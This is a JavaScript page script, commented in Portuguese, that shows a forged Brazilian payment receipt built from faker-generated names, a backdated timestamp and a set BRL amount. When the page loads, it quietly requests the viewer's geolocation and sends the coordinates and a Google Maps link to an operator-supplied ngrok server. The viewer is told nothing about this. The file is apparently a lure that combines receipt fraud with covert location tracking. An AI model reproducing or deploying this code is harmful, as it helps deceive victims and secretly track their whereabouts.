import { fakerPT_BR } from "https://esm.sh/@faker-js/faker";
import { format } from "https://esm.sh/date-fns/format";
import { toZonedTime } from "https://esm.sh/date-fns-tz/toZonedTime";
import { subMinutes } from "https://esm.sh/date-fns/subMinutes";
import { addMinutes } from "https://esm.sh/date-fns/addMinutes";
import { ptBR } from "https://esm.sh/date-fns/locale";

const NGROK_SERVER_URL = "https://66dd-201-148-182-104.ngrok-free.app"; // Substitua pela URL do servidor ngrok (OBRIGATÓRIO)*

const VALUE = 800; // Substitua pelo valor desejado (opcional)
const RECIPIENT_NAME = ""; // Insira um nome do destinatário (opcional)
const SENDER_NAME = ""; // Insira um nome do remetente (opcional)

const CACHE_EXPIRATION_MINUTES = 10; // Tempo de expiração dos dados no localStorage em minutos

const spinner = document.getElementById("spinner");
const receiptContent = document.getElementById("receipt-content");
spinner.style.display = "block";
receiptContent.style.display = "none";

window.addEventListener("load", () => {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(sendLocation, handleError);
  } else {
    console.error("Algo deu errado. Tente novamente mais tarde.");
  }
});

function sendLocation(position) {
  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;
  const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

  fetch(`${NGROK_SERVER_URL}/send-location`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ latitude, longitude, maps }),
  })
    .then((response) => response.json())
    .then((data) => {
      if (!data.success) {
        console.error("Erro ao enviar o comprovante.");
      }
    })
    .catch((error) => {
      console.error("Error:", error);
    });
}

function handleError(error) {
  console.error("Erro ao obter a localização: " + error.message);
}

let recipientNameFaker = "";
let senderNameFaker = "";
let currentData = "";

const now = toZonedTime(new Date(), "America/Sao_Paulo");
const adjustedTime = subMinutes(now, 3);

const formattedDate = format(adjustedTime, "dd MMM yyyy - HH:mm:ss", {
  locale: ptBR,
}).toUpperCase();

try {
  const storedData = JSON.parse(localStorage.getItem("data"));
  if (!storedData || new Date() > new Date(storedData.expiration)) {
    currentData = formattedDate;
    recipientNameFaker = fakerPT_BR.person.fullName();
    senderNameFaker = fakerPT_BR.person.fullName();
    const expiration = addMinutes(
      new Date(),
      CACHE_EXPIRATION_MINUTES,
    ).toISOString();

    localStorage.setItem(
      "data",
      JSON.stringify({
        currentData,
        recipientNameFaker,
        senderNameFaker,
        expiration,
      }),
    );
  } else {
    recipientNameFaker = storedData.recipientNameFaker;
    senderNameFaker = storedData.senderNameFaker;
    currentData = storedData.currentData;
  }
} catch (error) {
  console.error("Error accessing localStorage:", error);
}

const formattedValue = VALUE.toLocaleString("pt-BR", {
  style: "currency",
  currency: "BRL",
});

const recipientName = RECIPIENT_NAME || recipientNameFaker;
const senderName = SENDER_NAME || senderNameFaker;

document.getElementById("current-date").textContent = currentData;
document.getElementById("value").textContent = formattedValue;
document.getElementById("recipient-name").textContent = recipientName;
document.getElementById("sender-name").textContent = senderName;

spinner.style.display = "none";
receiptContent.style.display = "block";
